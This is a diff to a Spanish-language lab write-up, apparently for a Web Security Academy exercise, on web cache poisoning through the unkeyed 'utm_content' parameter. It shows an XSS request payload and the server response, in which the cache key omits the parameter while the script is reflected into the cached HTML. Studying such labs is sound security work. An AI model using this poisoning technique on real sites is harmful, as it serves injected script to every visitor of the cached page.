@@ -15,13 +15,17 @@ tags:
 ## Qué muestra
 El caché **excluye de la key ciertos parámetros** (típicos de analítica: `utm_content`, `utm_source`, etc.) porque "no cambian la página". Pero si la app **los refleja**, tenés un input **unkeyed** perfecto: inyectás XSS en `utm_content` y **no cambia la key** → se cachea para todos.
 
-## Request
+## Request → Response
 
 > `GET /?utm_content=`==`<@burp_urlencode>'/><script>alert(1)</script><'</@burp_urlencode>`==` HTTP/2`
 > `Host: 0ae0...web-security-academy.net`
 > `Pragma: x-get-cache-key`
 
-**⬇️ se refleja en el body de `/`** (con `Pragma: x-get-cache-key` confirmás que `utm_content` no entra en la key)
+**⬇️ la key omite `utm_content` (unkeyed) pero el valor se refleja en el HTML → se cachea para todos:**
+
+> `HTTP/2 200 OK`
+> `X-Cache-Key: 0ae0...web-security-academy.net/` (← sin `utm_content`)
+> `<meta property="og:url" content="https://.../?utm_content=`==`'/><script>alert(1)</script><'`==`"/>`
 
 ## Por qué funciona
 - **Keyed:** `host + path` (y quizás otros params). **Unkeyed:** `utm_content`.
